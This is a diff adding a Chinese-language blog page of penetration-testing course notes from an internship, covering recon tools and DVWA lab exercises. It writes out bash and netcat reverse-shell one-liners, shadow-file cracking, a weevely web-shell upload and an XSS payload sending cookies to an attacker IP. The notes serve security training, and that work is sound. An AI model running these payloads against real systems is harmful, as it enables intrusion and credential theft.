@@ -1,0 +1,873 @@
+<!DOCTYPE html><html lang="zh-TW" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>實習筆記-滲透測試課程 | Kevin Liu's 部落格 || Technical || Travel</title><meta name="author" content="Kevin Liu"><meta name="copyright" content="Kevin Liu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="實習時的滲透測試課程也稍微紀錄一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="實習筆記-滲透測試課程">
+<meta property="og:url" content="https://leozzmc.github.io/posts/8ec27a58.html">
+<meta property="og:site_name" content="Kevin Liu&#39;s 部落格 || Technical || Travel">
+<meta property="og:description" content="實習時的滲透測試課程也稍微紀錄一下">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://leozzmc.github.io/img/me.jpg">
+<meta property="article:published_time" content="2022-01-09T19:07:06.000Z">
+<meta property="article:modified_time" content="2023-07-02T14:13:30.435Z">
+<meta property="article:author" content="Kevin Liu">
+<meta property="article:tag" content="Penetration Testing">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leozzmc.github.io/img/me.jpg"><link rel="shortcut icon" href="/img/kevin3.png"><link rel="canonical" href="https://leozzmc.github.io/posts/8ec27a58.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-T4SFRRLLZ0"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-T4SFRRLLZ0');
+</script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查詢的內容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":3,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '複製成功',
+    error: '複製錯誤',
+    noSupport: '瀏覽器不支援'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '剛剛',
+    min: '分鐘前',
+    hour: '小時前',
+    day: '天前',
+    month: '個月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '實習筆記-滲透測試課程',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-02 22:13:30'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/me.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a><a href="/tags/"><div class="headline">標籤</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分類</div><div class="length-num">9</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 歸檔</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 鏈結</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-language"></i><span> 語言:</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/en/"><i class="fa-fw fas fa-e"></i><span> English</span></a></li><li><a class="site-page child" href="/"><i class="fa-fw fa-c"></i><span> 中文</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.imgur.com/zuXQ4RA.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Kevin Liu's 部落格 || Technical || Travel"><img class="site-icon" src="https://i.imgur.com/P19VCm0.png"/><span class="site-name">Kevin Liu's 部落格 || Technical || Travel</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜尋</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 找文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 歸檔</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 鏈結</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-language"></i><span> 語言:</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/en/"><i class="fa-fw fas fa-e"></i><span> English</span></a></li><li><a class="site-page child" href="/"><i class="fa-fw fa-c"></i><span> 中文</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">實習筆記-滲透測試課程</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">發表於</span><time class="post-meta-date-created" datetime="2022-01-09T19:07:06.000Z" title="發表於 2022-01-10 03:07:06">2022-01-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新於</span><time class="post-meta-date-updated" datetime="2023-07-02T14:13:30.435Z" title="更新於 2023-07-02 22:13:30">2023-07-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AD%B8%E7%BF%92%E7%AD%86%E8%A8%98/">學習筆記</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="實習筆記-滲透測試課程"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">閱讀量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>課程內容:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- Web基本知識</span><br><span class="line">- 主動/被動資訊收集</span><br><span class="line">- 常見的web漏洞</span><br><span class="line">- 靶機</span><br><span class="line">- DVWA（Damn Vulnerable Web Application）</span><br><span class="line">- RF(無線射頻)滲透測試(物聯網)</span><br><span class="line">- 基本的通訊協定</span><br><span class="line">- 軟體定義無線電SDR</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="PT-滲透測試-vs-RT-紅隊演練"><a href="#PT-滲透測試-vs-RT-紅隊演練" class="headerlink" title="PT(滲透測試) vs RT(紅隊演練)"></a>PT(滲透測試) vs RT(紅隊演練)</h2><ul>
+<li>PT:範圍較小，且無法針對社交工程 ex.某個網頁</li>
+<li>RT:範圍較大 ex.整個公司</li>
+</ul>
+<p>黑箱:最貼近真實情境<br>白箱:盡可能提供相關資訊給受測者<br>灰箱:黑白箱混和，會提供自我宣告表以後再給受測者測試</p>
+<h2 id="滲透測試流程"><a href="#滲透測試流程" class="headerlink" title="滲透測試流程:"></a>滲透測試流程:</h2><ol>
+<li>資料蒐集</li>
+<li>透洞掃描</li>
+<li>漏洞利用<br> 白帽:<ol start="4">
+<li>漏洞回報<br> 黑帽:</li>
+<li>提權限</li>
+<li>持續性存取</li>
+<li>防禦逃脫(逃脫會叫的那種警報器)</li>
+<li>資料攜出(把DB分批攜出)<br><img src="https://i.imgur.com/10o9kG8.jpg"></li>
+</ol>
+</li>
+</ol>
+<h2 id="IOT的攻擊向量-Attack-Vector"><a href="#IOT的攻擊向量-Attack-Vector" class="headerlink" title="IOT的攻擊向量(Attack Vector)"></a>IOT的攻擊向量(Attack Vector)</h2><p><img src="https://i.imgur.com/CFMACnJ.jpg"></p>
+<ul>
+<li>Hardware:Physical Interface<br>  給開發人員使用，出廠後並未關掉，若能訪問到該接口通常都能直接取得root，通常底層皆為明文傳輸<ul>
+<li>設備外殼並未提供保護機制</li>
+<li>底層使用明文傳輸</li>
+<li>毛刺攻擊(Glitching):用微小的電壓，去擾動硬體設備</li>
+<li>測信到攻擊(Side Channel Attack):加密晶片，可以去量測他的電壓、音頻…，用這些東西去分析加密的方式、Key等等</li>
+</ul>
+</li>
+<li>韌體(Firmware):Hardcode, Enc key, exploit<ul>
+<li>軟體&#x2F;韌體未進行加密</li>
+<li>有敏感資料</li>
+</ul>
+</li>
+<li>Software:Andriod app</li>
+<li>Radio:Cellular, WiFi, 蜂窩網路<ul>
+<li>無線通訊未加密可進行嗅探(Sniffer)</li>
+<li>干擾攻擊(Jamming)</li>
+<li>重放攻擊</li>
+<li>模糊攻擊(fuzz):需先擬向工程才能fuzz</li>
+<li>通訊協定:最麻煩，需要原廠處理</li>
+</ul>
+</li>
+<li>Cloud:<ul>
+<li>API攻擊</li>
+<li>注入攻擊</li>
+<li>身分認證&#x2F;授權機制</li>
+<li>邏輯漏洞</li>
+<li>web漏洞</li>
+</ul>
+</li>
+</ul>
+<h2 id="網頁的攻擊向量"><a href="#網頁的攻擊向量" class="headerlink" title="網頁的攻擊向量"></a>網頁的攻擊向量</h2><p><img src="https://i.imgur.com/zfkdfrI.jpg"><br>Web1.0</p>
+<ul>
+<li>布告欄的概念</li>
+<li>只有靜態網頁</li>
+</ul>
+<p>Web2.0</p>
+<ul>
+<li>可讀寫，多功能的動態頁面</li>
+<li>應用程序</li>
+<li>DB(個資)</li>
+<li>API</li>
+<li>不同用戶會有不同的頁面</li>
+</ul>
+<p>Web3.0</p>
+<ul>
+<li>去中心化(資料分散放)</li>
+</ul>
+<p>HTTP</p>
+<ul>
+<li>由Request&#x2F;Response組成</li>
+<li>由於HTTP屬於無狀態，因此需依賴cookie機制來記錄user資訊與time</li>
+<li>狀態碼<br>  <img src="https://i.imgur.com/Bk1hb59.png"></li>
+</ul>
+<h2 id="攻擊標的"><a href="#攻擊標的" class="headerlink" title="攻擊標的"></a>攻擊標的</h2><ol>
+<li>使用者身分</li>
+</ol>
+<ul>
+<li>認證</li>
+<li>權限劃分</li>
+<li>Session<br>ex.HTTP封包格式皆相同，該基站</li>
+</ul>
+<ol start="2">
+<li>輸入輸出:</li>
+</ol>
+<ul>
+<li>Sql Injection</li>
+<li>Command Injection</li>
+<li>需經過正規化處理</li>
+<li>開發者需要設定確定的字元<br>ex. 數字欄位填中文或英文</li>
+</ul>
+<ol start="3">
+<li>程式邏輯</li>
+</ol>
+<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具:"></a>常用工具:</h2><p>Information Gathering:分為主動、被動</p>
+<ul>
+<li><p>主動資訊蒐集<br>  <img src="https://i.imgur.com/M9nPHnv.png"></p>
+<ul>
+<li>nmap主動蒐集目標資訊:掃描目標主機port<br>  <img src="https://i.imgur.com/GTvO6kr.jpg"></li>
+<li>Nikto開源的網站弱點掃描工具:自帶在Kali內</li>
+<li>Dirb暴力枚舉網頁下的目錄與檔案  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dirb url</span><br><span class="line">#去看網頁內存不存在敏感資料</span><br><span class="line">#有可能可以掃出使用者的路徑</span><br><span class="line">#如果有開阿帕契作為中繼站，能掃出來</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>被動資訊蒐集</p>
+<ul>
+<li><p>用被動資料(IP、姓名、生日..)來描述目標</p>
+</li>
+<li><p>不與目標直接接觸，避免留下痕跡</p>
+</li>
+<li><p>SHODAN</p>
+<ul>
+<li>可以掃描世界上所有的物聯網設備</li>
+<li>主機</li>
+<li>開啟端口</li>
+<li>是否有已知漏洞</li>
+<li>可使用下方關鍵字搜尋:<ul>
+<li>hostname：搜尋指定的主機或域名，例如 hostname:”google”</li>
+<li>port：搜尋指定的埠或服務，例如 port:”21”</li>
+<li>country：搜尋指定的國家，例如 country:”CN”</li>
+<li>city：搜尋指定的城市，例如 city:”Hefei”</li>
+<li>org：搜尋指定的組織或公司，例如 org:”google”</li>
+<li>isp：搜尋指定的ISP供應商，例如 isp:”China Telecom”</li>
+<li>product：搜尋指定的作業系統&#x2F;軟體&#x2F;平臺，例如 product:”Apache httpd”</li>
+<li>version：搜尋指定的軟體版本，例如 version:”1.6.2”</li>
+<li>geo：搜尋指定的地理位置，引數為經緯度，例如 geo:”31.8639, 117.2808”</li>
+<li>before&#x2F;after：搜尋指定收錄時間前後的資料，格式為dd-mm-yy，例如 before:”11-11-15”</li>
+<li>net：搜尋指定的IP地址或子網，例如net:”210.45.240.0&#x2F;24”</li>
+<li>參考:<ul>
+<li><a target="_blank" rel="noopener" href="https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf">https://www.tp1rc.edu.tw/tpnet2020/training/1090303.pdf</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.itread01.com/content/1546699324.html">https://www.itread01.com/content/1546699324.html</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>Google Hacking</p>
+<ul>
+<li>用Google Search針對目標進行情報搜尋</li>
+<li>用”site:”去搜尋</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>過濾封包</p>
+<ul>
+<li>Burp Suite<br>  使用方法:<br>  使用Kali 開啟Burp Site<br>  <img src="https://i.imgur.com/8gomHwp.png"><br>  開啟proxy 表示之後所有流量都會經過burp<br>  &lt;之前的版本需要簽憑證&gt;<br>  使用Proxy開啟browser<br>  <img src="https://i.imgur.com/dWxhFur.png"><br>  進到project option&gt;MIST&gt;勾選Enable<br>  <img src="https://i.imgur.com/vswHeoq.png"><br>  就可以繼續使用proxy<br>  <img src="https://i.imgur.com/HwXBX1w.png"><br>  將IPor網址執行於瀏覽器中，封包就會被攔截進brower<br>  <img src="https://i.imgur.com/OATh3RT.png"><br>  <br><br></li>
+</ul>
+</li>
+<li><p>暴力破解<br>  <img src="https://i.imgur.com/YuudCcZ.png"><br>  <img src="https://i.imgur.com/kf2mOL5.png"><br>  不同的Attack type有不同模式<br>  sniper:針對字典中設定的值交替順序測試<br>  <img src="https://i.imgur.com/An2qwjw.png"><br>  將存取內容傳到Repeater確認回應結果<br>  <img src="https://i.imgur.com/Tgird85.png"></p>
+<p>  <img src="https://i.imgur.com/nwWHDyM.png"></p>
+</li>
+</ul>
+<br>
+
+<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>因為沒有針對用戶輸入進行過濾，因此會造成機敏資料外洩、等問題<br>Linux command</p>
+<table>
+<thead>
+<tr>
+<th>Column 1</th>
+<th>Column 2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>; or &amp;</td>
+<td>不管第一次執行的指令是否成功皆會執行第二個</td>
+</tr>
+<tr>
+<td>&amp;&amp;</td>
+<td>第一個指令失敗不會執行下一個</td>
+</tr>
+<tr>
+<td>I(槓槓符號)</td>
+<td>會把前一個指令的輸出當作下一個指令的輸入</td>
+</tr>
+<tr>
+<td>II(槓槓符號)</td>
+<td>會把前一個指令的輸出當作下一個指令的輸入</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h2><p>1.Enter IP to get shell</p>
+<p><img src="https://i.imgur.com/GZG7eOA.png"><br>可使用command加入一些linux指令<br><img src="https://i.imgur.com/FI8yUNJ.png"></p>
+<p><img src="https://i.imgur.com/33iCHlV.png"><br>cat去撈 &#x2F;etc&#x2F;shadow<br><img src="https://i.imgur.com/zthZGDt.png"><br>ls -al 查看檔案權限<br><img src="https://i.imgur.com/Fl5HR9S.png"></p>
+<p>ls -al | grep shadow<br>linux<br>&#x2F;etc&#x2F;passwd linux以前會把所有帳密放在裡面<br>&#x2F;etc&#x2F;shadow 現在linux會將它分開</p>
+<h4 id="Reverse-shell"><a href="#Reverse-shell" class="headerlink" title="Reverse shell"></a><em>Reverse shell</em></h4><p>受害者的機器自行連回攻擊者的機器(出來比進去簡單)</p>
+<p><strong>Bash</strong></p>
+<ul>
+<li>Victim: bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1</li>
+<li>Attacker:nc -nvlp port</li>
+</ul>
+<p><strong>Netcat</strong></p>
+<ul>
+<li>Victim:nc ip port -e &#x2F;bin&#x2F;bash</li>
+<li>Attacker:nc -nvlp port</li>
+</ul>
+<p><img src="https://i.imgur.com/WHPfdBH.png"></p>
+<p><strong>john the ripper</strong>暴力破解<br>可以參考Linux 的 &#x2F;etc&#x2F;shadow 檔案結構<br><a target="_blank" rel="noopener" href="https://blog.gtwang.org/linux/linux-etc-shadow-file-format/">https://blog.gtwang.org/linux/linux-etc-shadow-file-format/</a></p>
+<p>xdg-open &gt;&gt; 呈現file讓你可以直接開啟文件</p>
+<br>
+
+<p><strong>破解liunx root密碼</strong><br>將passwd和shadow合併 寫入crack中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unshadow passwd shadow &gt; crack</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/vRRh7bK.png"><br>使用john來破解密碼<br><img src="https://i.imgur.com/JiAkG0d.png"></p>
+<p><strong>破解Window root密碼</strong><br>SAM file<br>NTLM hash<br>Net-NTLM 網路上做金鑰交換的地方</p>
+<p><strong>CVE Details</strong><br>可以去追蹤<br>不會有要怎麼利用該漏洞的程式碼<br><strong>Expoitdb</strong><br>可以追蹤漏洞<br>remote code execution(RCE)遠程代碼執行漏洞</p>
+<p><strong>Metasploit</strong><br><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10224527">https://ithelp.ithome.com.tw/articles/10224527</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/fGYsqLW.png"></p>
+<p><img src="https://i.imgur.com/nUGB4m6.png"></p>
+<h2 id="靶機測試-192-168-5-107"><a href="#靶機測試-192-168-5-107" class="headerlink" title="靶機測試(192.168.5.107)"></a>靶機測試(192.168.5.107)</h2><h3 id="NET-config"><a href="#NET-config" class="headerlink" title="NET config"></a>NET config</h3><p>網路要使用橋接介面卡</p>
+<ol>
+<li><p>&lt;資料蒐集&gt;先測試受害機的port有什麼是開啟的<br>使用nmap查看已開啟的port<br><img src="https://i.imgur.com/4YYhxLY.png"><br>可以查看bin裡面有什麼command可以使用<br><img src="https://i.imgur.com/5HngrIj.png"></p>
+</li>
+<li><p>&lt;利用弱點&gt;登入<br>使用SQL Injection去登入</p>
+</li>
+<li><p>使用受害者電腦連回攻擊者電腦<br>可使用下方這兩個去</p>
+</li>
+</ol>
+<ul>
+<li>bash</li>
+<li>netcat</li>
+</ul>
+<ol start="4">
+<li><p>&lt;資料蒐集&gt;蒐集受害者電腦資訊</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">uname-a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/W7DQDcI.png"></p>
+</li>
+<li><p>&lt;弱點掃描&gt;使用exploitsdb查詢漏洞<br> <img src="https://i.imgur.com/IajKmAT.png"></p>
+<p> <img src="https://i.imgur.com/BFOaibq.png"></p>
+</li>
+<li><p>在本地電腦開啟apache服務<br> <img src="https://i.imgur.com/6Cimn6A.png"><br> 開啟畫面如下<br> <img src="https://i.imgur.com/TZk5bR6.png"><br> 將需要的檔案放進apache資料夾中，使得之後受害電腦可以下載apache中的資料<br> <img src="https://i.imgur.com/AO8UQ2n.png"><br> <img src="https://i.imgur.com/Pe9lYUr.png"></p>
+</li>
+<li><p>&lt;利用漏洞&gt;在受害者電腦中下載漏洞檔案<br> 使用pwd確認位址指向tmp<br> (由於權限不足因此需要找一個當前權限可以讀寫的位址)<br> 使用wget下載本機開啟的apache<br> <img src="https://i.imgur.com/RdeYP6B.png"><br> <img src="https://i.imgur.com/wVEsi1U.png"><br> 確認權限<br> <img src="https://i.imgur.com/oc9Q7jV.png"></p>
+</li>
+</ol>
+<h3 id="File-Upload"><a href="#File-Upload" class="headerlink" title="File Upload"></a>File Upload</h3><p>使用weevely生成backdoor.php<br><img src="https://i.imgur.com/perGeXy.png"><br>將檔案上傳回dvwa的網站<br><img src="https://i.imgur.com/uZlHxZq.png"><br>使用weevely連到該上傳路徑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely http://IP/dvwa/hackable/uploads/backdoor.php pwd(密碼)</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/PkDJBTn.png"><br>查看開主機狀態<br><img src="https://i.imgur.com/L9KupbP.png"></p>
+<p>&lt;中等難度&gt;<br>前端會擋非image會擋<br>先將惡意檔案改成.jpeg</p>
+<p>上傳該檔案，使用burp suite攔截封包，並將封包內檔名更改為php即可<br><img src="https://i.imgur.com/DKwFDBe.png"></p>
+<h3 id="LFI-Local-File-Inclusion"><a href="#LFI-Local-File-Inclusion" class="headerlink" title="LFI(Local File Inclusion)"></a>LFI(Local File Inclusion)</h3><p>本地文件包含漏洞(LFI)</p>
+<p>敏感檔案:</p>
+<ul>
+<li><strong>&#x2F;etc&#x2F;passwd</strong></li>
+<li><strong>&#x2F;var&#x2F;log&#x2F;auth.log</strong><ul>
+<li>紀錄哪些user連這台機器</li>
+</ul>
+</li>
+<li><strong>&#x2F;var&#x2F;log&#x2F;apacke2&#x2F;access.log&#x2F;error.log</strong><ul>
+<li>有出現過哪些錯誤訊息</li>
+</ul>
+</li>
+<li><strong>..&#x2F;..&#x2F;..&#x2F;</strong><ul>
+<li>可以去翻他有那些檔案</li>
+</ul>
+</li>
+<li><strong>%WINDIR%\win.ini</strong><ul>
+<li>win設定檔，可以看config</li>
+</ul>
+</li>
+</ul>
+<p>可以在?page&#x3D;後面放入<strong>絕對路徑</strong>來查找資料<br><img src="https://i.imgur.com/KLw7zdD.png"></p>
+<p><img src="https://i.imgur.com/2pHxd91.png"></p>
+<p><img src="https://i.imgur.com/QGulfsK.png"></p>
+<h3 id="RFI-Remote-File-Inclusion"><a href="#RFI-Remote-File-Inclusion" class="headerlink" title="RFI(Remote File Inclusion)"></a>RFI(Remote File Inclusion)</h3><p>有RFI漏洞<br>需要開啟funcion:</p>
+<ul>
+<li>allow_url_fopen</li>
+<li>allow_url_include</li>
+</ul>
+<p><img src="https://i.imgur.com/DDVoXPL.png"></p>
+<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>跨腳本攻擊(Cross Site Scripting)<br>攻擊對象為user端，非server端</p>
+<p>漏洞利用條件</p>
+<ul>
+<li>伺服器對用戶提交數據過濾不夠嚴謹</li>
+<li>使用社交工程讓受害者點擊觸發<br>影響:</li>
+<li>重定向(掛馬)不應該被倒到的網站</li>
+<li>盜取cookie</li>
+<li>釣魚<br>類型:</li>
+<li>反射型:返回腳本並由user要去點擊才會中招</li>
+<li>儲存型:js code 存在server端，不管user有沒有點擊，都會觸發。</li>
+</ul>
+<p>下js code</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;call 911&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/T3rDDKJ.png"><br><img src="https://i.imgur.com/oOGulM2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/191wpbd.png"><br><img src="https://i.imgur.com/0T1ttyT.png"></p>
+<p>從user那邊偷到訊息傳到攻擊者端<br>監聽80 port<br>輸入js code 連到攻擊者IP回傳cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new image().src=&quot;http://ip/output=&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.imgur.com/Q0T1jW9.png"></p>
+<p>&lt;中等難度&gt;<br>過濾掉script，則可以使用大小寫來混淆他<br>ex.</p>
